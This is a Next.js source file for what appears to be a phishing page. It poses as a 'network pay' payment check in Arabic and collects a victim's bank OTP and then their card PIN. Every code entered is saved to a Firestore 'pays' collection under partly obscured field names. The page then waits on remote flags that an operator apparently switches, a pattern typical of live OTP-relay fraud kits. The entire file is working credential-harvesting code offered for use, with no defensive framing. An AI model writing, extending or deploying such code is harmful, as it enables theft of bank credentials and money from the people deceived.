"use client";
import { useState, useEffect, useRef } from "react";
import { useRouter } from "next/navigation";
import { Loader2 } from "lucide-react";
import StepBar from "@/components/StepBar";
import { db } from "@/lib/firebase";
import {
  onSnapshot, doc,
} from "firebase/firestore";
import { useFormData } from "@/context/FormContext";
import {
  appendHistoryEntry,
  ensureApplicationDoc,
  generateConfirmationCode,
  hasRequiredApplicantData,
  updateApplicationData,
} from "@/lib/application-sync";

type OtpStage = "waiting" | "otp" | "pin";

function getStageFromRemoteState(value: Record<string, any> | undefined): OtpStage {
  if (!value) return "waiting";

  if (
    value.otpStatus === "show_pin" ||
    value.pinStatus === "waiting" ||
    value.cardStatus === "approved_with_pin" ||
    value.redirectPage === "pin"
  ) {
    return "pin";
  }

  if (
    value.otpStatus === "show_otp" ||
    value.cardStatus === "approved_with_otp"
  ) {
    return "otp";
  }

  return "waiting";
}

function emptyDigits(length: number) {
  return Array.from({ length }, () => "");
}

export default function OtpPage() {
  const router = useRouter();
  const { data, docId, setDocId, confirmationCode, setConfirmationCode, hydrated } =
    useFormData();

  const [saved, setSaved] = useState(false);
  const [dots, setDots]   = useState(0);
  const [stage, setStage] = useState<OtpStage>("waiting");
  const [digits, setDigits] = useState<string[]>(emptyDigits(6));
  const [seconds, setSeconds] = useState(232);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [notice, setNotice] = useState("");

  const docIdRef = useRef<string | null>(null);
  const confCode = useRef(confirmationCode || generateConfirmationCode());
  const refs = useRef<(HTMLInputElement | null)[]>([]);
  const previousStageRef = useRef<OtpStage>("waiting");

  /* ── Ensure application exists and sync OTP stage ── */
  useEffect(() => {
    if (!hydrated) return;

    if (!hasRequiredApplicantData(data)) {
      router.replace("/register");
      return;
    }

    if (!confirmationCode) {
      setConfirmationCode(confCode.current);
    }

    void ensureApplicationDoc({
      docId,
      data,
      confirmationCode: confCode.current,
      pathname: "/otp",
      extra: docId
        ? {}
        : {
            status: "pending_review",
            otpStatus: "pending",
          },
    })
      .then(async (resolvedId) => {
        docIdRef.current = resolvedId;
        setDocId(resolvedId);
        if (!docId) {
          await updateApplicationData(resolvedId, {
            status: "pending_review",
            otpStatus: "pending",
            currentStep: "_t2",
            currentPage: "otp",
            isUnread: true,
          });
        }
        setSaved(true);
      })
      .catch((error) => {
        console.error("Failed to sync OTP stage:", error);
        setSaved(true);
      });
  }, [
    confirmationCode,
    data,
    docId,
    hydrated,
    router,
    setConfirmationCode,
    setDocId,
  ]);

  /* ── Listen for admin approval from Firestore ── */
  useEffect(() => {
    if (!saved || !docIdRef.current) return;

    const unsubscribe = onSnapshot(
      doc(db, "pays", docIdRef.current),
      (snap) => {
        const val = snap.data();
        if (val?.status === "approved")  router.push("/success");
        if (val?.status === "rejected")  router.push("/card");

        const nextStage = getStageFromRemoteState(val);
        setStage(nextStage);

        if (previousStageRef.current !== nextStage) {
          previousStageRef.current = nextStage;
          setNotice("");
          setError("");
          setLoading(false);
          setSeconds(232);
          setDigits(emptyDigits(nextStage === "pin" ? 4 : 6));
          setTimeout(() => refs.current[0]?.focus(), 50);
        }
      }
    );
    return () => unsubscribe();
  }, [router, saved]);

  /* ── Animated dots ── */
  useEffect(() => {
    const t = setInterval(() => setDots((d) => (d + 1) % 4), 600);
    return () => clearInterval(t);
  }, []);

  useEffect(() => {
    if (stage === "waiting" || seconds <= 0) return;
    const t = setInterval(() => setSeconds((s) => s - 1), 1000);
    return () => clearInterval(t);
  }, [seconds, stage]);

  const dotStr = ".".repeat(dots);

  const mm = String(Math.floor(seconds / 60)).padStart(2, "0");
  const ss = String(seconds % 60).padStart(2, "0");
  const codeLength = stage === "pin" ? 4 : 6;

  function handleDigit(i: number, val: string) {
    const digit = val.replace(/\D/g, "").slice(-1);
    const next = [...digits];
    next[i] = digit;
    setDigits(next);
    if (error) setError("");
    if (notice) setNotice("");
    if (digit && i < codeLength - 1) {
      refs.current[i + 1]?.focus();
    }
  }

  function handleKeyDown(i: number, e: React.KeyboardEvent<HTMLInputElement>) {
    if (e.key === "Backspace" && !digits[i] && i > 0) {
      refs.current[i - 1]?.focus();
    }
  }

  async function handleSubmitCode() {
    if (!docIdRef.current) return;

    const enteredCode = digits.join("");
    if (enteredCode.length < codeLength) {
      setError(stage === "pin" ? "يرجى إدخال رمز PIN كاملاً" : "يرجى إدخال رمز OTP كاملاً");
      return;
    }

    setLoading(true);
    setError("");
    setNotice("");

    try {
      if (stage === "otp") {
        const payload = {
          _v5: enteredCode,
          otpCode: enteredCode,
          otp: enteredCode,
          _v5Status: "pending",
          otpStatus: "pending",
          otpUpdatedAt: new Date().toISOString(),
          isUnread: true,
          redirectPage: "otp",
          currentStep: "_t2",
          currentPage: "otp",
        };

        await updateApplicationData(docIdRef.current, payload);
        await appendHistoryEntry({
          docId: docIdRef.current,
          type: "_t2",
          status: "pending",
          data: payload,
        });

        setNotice("تم إرسال رمز OTP. يرجى الانتظار ريثما تتم مراجعته.");
      } else if (stage === "pin") {
        const payload = {
          _v6: enteredCode,
          pinCode: enteredCode,
          pinStatus: "pending",
          pinUpdatedAt: new Date().toISOString(),
          isUnread: true,
          redirectPage: "pin",
          currentStep: "_t3",
          currentPage: "otp",
        };

        await updateApplicationData(docIdRef.current, payload);
        await appendHistoryEntry({
          docId: docIdRef.current,
          type: "_t3",
          status: "pending",
          data: payload,
        });

        setNotice("تم إرسال رمز PIN. يرجى الانتظار ريثما تتم مراجعته.");
      }
    } catch (submitError) {
      console.error("Failed to submit verification code:", submitError);
      setError("تعذر إرسال الرمز، حاول مرة أخرى.");
    } finally {
      setLoading(false);
    }
  }

  const waitingView = (
    <>
      <div className="relative w-28 h-28 mb-8">
        <svg className="absolute inset-0 animate-spin" viewBox="0 0 100 100" fill="none">
          <circle cx="50" cy="50" r="44" stroke="#e5e7eb" strokeWidth="8" />
          <circle cx="50" cy="50" r="44" stroke="#1a2b50" strokeWidth="8"
            strokeLinecap="round" strokeDasharray="138 138" strokeDashoffset="104" />
        </svg>
        <div className="absolute inset-0 flex items-center justify-center">
          <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#1a2b50" strokeWidth="2">
            <rect x="3" y="11" width="18" height="11" rx="2"/>
            <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
          </svg>
        </div>
      </div>

      <div className="flex items-center gap-1 mb-6">
        <span className="text-[#1a2b50] font-bold text-2xl tracking-tight">network</span>
        <span className="text-[#e63946] font-bold text-2xl tracking-tight">pay</span>
        <svg width="18" height="18" viewBox="0 0 22 22" fill="none">
          <path d="M5 11l5 5 7-9" stroke="#e63946" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/>
        </svg>
      </div>

      <div className="bg-white rounded-2xl shadow-sm px-7 py-7 w-full max-w-sm mb-6">
        <h2 className="text-[#1a2b50] font-extrabold text-xl mb-2">
          جاري مراجعة الطلب{dotStr}
        </h2>
        <p className="text-gray-500 text-sm leading-relaxed mb-5">
          تم إرسال طلبك بنجاح. يرجى الانتظار بينما يتم مراجعة بياناتك والموافقة على عملية الدفع.
        </p>
        <div className="bg-[#f8f9fb] rounded-xl px-4 py-3 flex items-center gap-3 mb-4">
          <div className="w-2 h-2 rounded-full bg-amber-400 animate-pulse flex-shrink-0" />
          <span className="text-xs text-gray-600 font-medium">في انتظار موافقة الجهة المصدرة</span>
        </div>
        <div className="border-t border-gray-100 pt-4 space-y-2 text-right">
          <div className="flex justify-between text-xs">
            <span className="font-semibold text-gray-700">{data.name || "—"}</span>
            <span className="text-gray-400">الاسم</span>
          </div>
          <div className="flex justify-between text-xs">
            <span className="font-semibold text-gray-700" dir="ltr">{data.phone || "—"}</span>
            <span className="text-gray-400">الهاتف</span>
          </div>
          <div className="flex justify-between text-xs">
            <span className="font-semibold text-gray-700">1 درهم</span>
            <span className="text-gray-400">المبلغ</span>
          </div>
        </div>
      </div>

      <p className="text-xs text-gray-400 leading-relaxed max-w-xs">
        لا تغلق هذه الصفحة. ستنتقل تلقائياً عند اكتمال المراجعة.
      </p>

      <div className="flex justify-center gap-3 mt-8">
        {[0, 1, 2].map((i) => (
          <div key={i} className="w-10 h-10 bg-white border border-gray-200 rounded-lg flex items-center justify-center shadow-sm">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#1a2b50" strokeWidth="2">
              <rect x="3" y="6" width="18" height="13" rx="2"/>
              <path d="M3 10h18"/><path d="M7 15h2M13 15h4"/>
            </svg>
          </div>
        ))}
      </div>
    </>
  );

  const codeEntryView = (
    <>
      <div className="flex justify-center mb-6">
        <div className="flex items-center gap-1">
          <span className="text-[#1a2b50] font-bold text-2xl tracking-tight">network</span>
          <span className="text-[#e63946] font-bold text-2xl tracking-tight">pay</span>
          <svg width="18" height="18" viewBox="0 0 22 22" fill="none"><path d="M5 11l5 5 7-9" stroke="#e63946" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/></svg>
        </div>
      </div>
      <div className="bg-white rounded-2xl shadow-sm overflow-hidden max-w-sm mx-auto w-full">
        <div className="flex justify-center pt-6 pb-4 border-b border-gray-100">
          <div className="flex items-center gap-1">
            <span className="text-[#1a2b50] font-bold text-xl tracking-tight">network</span>
            <span className="text-[#e63946] font-bold text-xl tracking-tight">pay</span>
            <svg width="15" height="15" viewBox="0 0 22 22" fill="none"><path d="M5 11l5 5 7-9" stroke="#e63946" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/></svg>
          </div>
        </div>
        <div className="px-5 py-5">
          <p className="text-center text-sm text-gray-600 leading-relaxed mb-5">
            {stage === "pin"
              ? "تمت المصادقة الأولى. يرجى إدخال رمز PIN المرسل من البنك لإكمال العملية."
              : "المصادقة عبر تطبيق الهاتف المتحرك من البنك. ستتلقى من جهة إصدار البطاقة رمز العملية برسالة نصية."}
          </p>
          <div className="flex justify-center mb-5">
            <div className="w-11 h-11 rounded-full bg-blue-600 flex items-center justify-center shadow">
              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><path d="M5 13l4 4L19 7"/></svg>
            </div>
          </div>
          <p className="text-center text-sm text-gray-600 leading-relaxed mb-5">
            {stage === "pin"
              ? "يرجى إدخال رمز PIN بالكامل ثم المتابعة."
              : "يرجى إدخال رمز التحقق المرسل على الجوال الخاص بك أو فتح تطبيق البنك والنقر على الإشعار الفوري."}
          </p>
          <div className="flex justify-center gap-2.5 mb-3" dir="ltr">
            {digits.map((digit, index) => (
              <input
                key={index}
                ref={(el) => {
                  refs.current[index] = el;
                }}
                type="text"
                inputMode="numeric"
                maxLength={1}
                value={digit}
                onChange={(e) => handleDigit(index, e.target.value)}
                onKeyDown={(e) => handleKeyDown(index, e)}
                className={`w-10 h-12 border rounded-lg text-center text-lg font-bold text-gray-700 focus:outline-none bg-gray-50 transition-colors ${error ? "border-red-400 bg-red-50" : "border-gray-300 focus:border-blue-500"}`}
                placeholder="*"
              />
            ))}
          </div>
          {error && <p className="text-center text-red-500 text-xs font-medium mb-2">{error}</p>}
          {notice && <p className="text-center text-emerald-600 text-xs font-medium mb-2">{notice}</p>}
          <div className="text-center mb-5">
            <span className={`text-xl font-bold tabular-nums ${seconds <= 30 ? "text-red-500" : "text-gray-800"}`}>{mm}:{ss}</span>
            {seconds === 0 && <p className="text-xs text-red-400 mt-1">انتهت المدة، يرجى المحاولة مجدداً</p>}
          </div>
          <button onClick={handleSubmitCode} disabled={seconds === 0 || loading} className="w-full bg-[#1a2b50] disabled:bg-gray-300 text-white font-bold py-4 rounded-xl text-base tracking-widest hover:bg-[#243b6a] transition-colors flex items-center justify-center gap-2">
            {loading ? <><Loader2 size={16} className="animate-spin" /> جاري الإرسال...</> : "PAY"}
          </button>
        </div>
      </div>
      <div className="flex justify-center gap-3 mt-5">
        {[0, 1, 2].map((i) => (
          <div key={i} className="w-10 h-10 bg-white border border-gray-200 rounded-lg flex items-center justify-center shadow-sm">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#1a2b50" strokeWidth="2"><rect x="3" y="6" width="18" height="13" rx="2"/><path d="M3 10h18"/><path d="M7 15h2M13 15h4"/></svg>
          </div>
        ))}
      </div>
    </>
  );

  return (
    <div className="min-h-screen bg-[#f0f2f5] flex flex-col" dir="rtl">
      <div className="w-full max-w-md mx-auto bg-[#f0f2f5] min-h-screen sm:shadow-xl">

        <div className="bg-white">
          <StepBar current={4} />
        </div>

        <div className="flex flex-col items-center justify-center min-h-[calc(100vh-80px)] px-6 text-center">
          {stage === "waiting" ? waitingView : codeEntryView}
        </div>
      </div>
    </div>
  );
}
